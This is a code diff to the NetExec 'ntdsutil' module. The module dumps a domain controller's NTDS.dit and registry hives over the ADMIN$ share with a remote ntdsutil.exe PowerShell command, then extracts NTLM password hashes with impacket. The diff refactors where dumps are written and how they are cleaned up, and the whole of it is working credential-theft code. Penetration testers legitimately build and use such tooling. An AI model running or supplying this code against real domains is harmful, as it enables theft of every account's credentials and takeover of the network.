@@ -1,9 +1,9 @@
 import os
-import socket
+import shutil
+import tempfile
 import time
-import subprocess
-
 from nxc.paths import NXC_PATH
+
 from impacket.examples.secretsdump import LocalOperations, NTDSHashes
 
 from nxc.helpers.logger import highlight
@@ -14,6 +14,7 @@ class NXCModule:
     """
     Dump NTDS with ntdsutil
     Module by @zblurx
+
     """
 
     name = "ntdsutil"
@@ -27,42 +28,20 @@ class NXCModule:
         Dump NTDS with ntdsutil
         Module by @zblurx
 
-        DIR_RESULT  Local dir to write ntds dump.
+        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing
         """
         self.share = "ADMIN$"
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
         self.dump_location = str(time.time())[:9]
+        self.dir_result = self.dir_result = tempfile.mkdtemp()
         self.no_delete = False
-        self.user_specified_dir = "DIR_RESULT" in module_options
 
-        if self.user_specified_dir:
+        if "DIR_RESULT" in module_options:
             self.dir_result = os.path.abspath(module_options["DIR_RESULT"])
-            self.no_delete = True
-        else:
-            self.dir_result = None
             self.no_delete = True
 
     def on_admin_login(self, context, connection):
-        def get_hostname(connection):
-            # try smb nb server name first
-            try:
-                if hasattr(connection, "conn") and hasattr(connection.conn, "getServerName"):
-                    return connection.conn.getServerName()
-            except Exception:
-                pass
-            # fallback to reverse dns
-            try:
-                return socket.gethostbyaddr(connection.host)[0]
-            except Exception:
-                return "unknown_host"
-
-        ip = "unknown_ip"
-        hostname = "unknown_host"
-        if hasattr(connection, "host") and connection.host:
-            ip = connection.host
-            hostname = get_hostname(connection)
-
         command = f"powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full {self.tmp_dir}{self.dump_location}' q q\""
         context.log.display(f"Dumping ntds with ntdsutil.exe to {self.tmp_dir}{self.dump_location}")
         context.log.highlight("Dumping the NTDS, this could take a while so go grab a redbull...")
@@ -75,19 +54,9 @@ class NXCModule:
             context.log.fail("Error while dumping NTDS")
             return
 
-        # use hostname and ip in log paths
-        dir_result_with_host = os.path.join(NXC_PATH, "logs", "ntds", f"ntdsutil_{hostname}_{ip}_{time.strftime('%Y-%m-%d_%H-%M-%S')}")
-
-        if not self.user_specified_dir:
-            self.dir_result = dir_result_with_host
-            os.makedirs(self.dir_result, exist_ok=True)
-            os.makedirs(os.path.join(self.dir_result, "Active Directory"), exist_ok=True)
-            os.makedirs(os.path.join(self.dir_result, "registry"), exist_ok=True)
-        else:
-            # if user specified dir_result, create dirs here if needed
-            os.makedirs(self.dir_result, exist_ok=True)
-            os.makedirs(os.path.join(self.dir_result, "Active Directory"), exist_ok=True)
-            os.makedirs(os.path.join(self.dir_result, "registry"), exist_ok=True)
+        os.makedirs(self.dir_result, exist_ok=True)
+        os.makedirs(os.path.join(self.dir_result, "Active Directory"), exist_ok=True)
+        os.makedirs(os.path.join(self.dir_result, "registry"), exist_ok=True)
 
         context.log.display(f"Copying NTDS dump to {self.dir_result}")
 
@@ -174,6 +143,15 @@ class NXCModule:
         add_ntds_hash.ntds_hashes = 0
         add_ntds_hash.added_to_db = 0
 
+        if not connection.output_filename:
+            timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
+            hostname = connection.hostname
+            ip = connection.host
+            filename = f"{hostname}_{ip}_{timestamp}.ntds"
+            output_dir = os.path.join(NXC_PATH, "logs", "ntds")
+            os.makedirs(output_dir, exist_ok=True)
+            connection.output_filename = os.path.join(output_dir, filename).rstrip(".ntds")
+
         NTDS = NTDSHashes(
             f"{self.dir_result}/Active Directory/ntds.dit",
             boot_key,
@@ -195,51 +173,16 @@ class NXCModule:
             context.log.success("Dumping the NTDS, this could take a while so go grab a redbull...")
             NTDS.dump()
             context.log.success(f"Dumped {highlight(add_ntds_hash.ntds_hashes)} NTDS hashes to {connection.output_filename}.ntds of which {highlight(add_ntds_hash.added_to_db)} were added to the database")
+
+            context.log.display("To extract only enabled accounts from the output file, run the following command: ")
+            context.log.display(f"grep -iv disabled {connection.output_filename}.ntds | cut -d ':' -f1")
         except Exception as e:
             context.log.fail(e)
 
         NTDS.finish()
 
-        if self.user_specified_dir:
+        if self.no_delete:
             context.log.display(f"Raw NTDS dump copied to {self.dir_result}, parse it with:")
             context.log.display(f"secretsdump.py -system '{self.dir_result}/registry/SYSTEM' -security '{self.dir_result}/registry/SECURITY' -ntds '{self.dir_result}/Active Directory/ntds.dit' LOCAL")
         else:
-            base_dir = os.path.join(os.environ["HOME"], ".nxc", "logs", "ntds")
-
-            system_path = os.path.join(self.dir_result, "registry", "SYSTEM")
-            security_path = os.path.join(self.dir_result, "registry", "SECURITY")
-            ntds_path = os.path.join(self.dir_result, "Active Directory", "ntds.dit")
-
-            timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
-            output_file = os.path.join(base_dir, f"{hostname}_{ip}_{timestamp}.ntds")
-
-            command = [
-                "impacket-secretsdump",
-                "-system",
-                system_path,
-                "-security",
-                security_path,
-                "-ntds",
-                ntds_path,
-                "local",
-                "-just-dc-ntlm",
-                "-user-status",
-            ]
-
-            context.log.display(f"Running impacket-secretsdump, output will be saved to {output_file}")
-            with open(output_file, "w") as outfile:
-                subprocess.run(command, stdout=outfile, stderr=subprocess.STDOUT)
-
-            # clean impacket-secretsdump output: remove first 7 lines and last line
-            with open(output_file) as f:
-                lines = f.readlines()
-
-            if len(lines) > 8:
-                cleaned_lines = lines[7:-1]
-                with open(output_file, "w") as f:
-                    f.writelines(cleaned_lines)
-
-            context.log.success(f"impacket-secretsdump output saved to {output_file}")
-            context.log.display("To extract only enabled accounts from the output file, run the following command: ")
-            context.log.display(f"grep -iv disabled {output_file} | cut -d ':' -f1")
-
+            shutil.rmtree(self.dir_result)
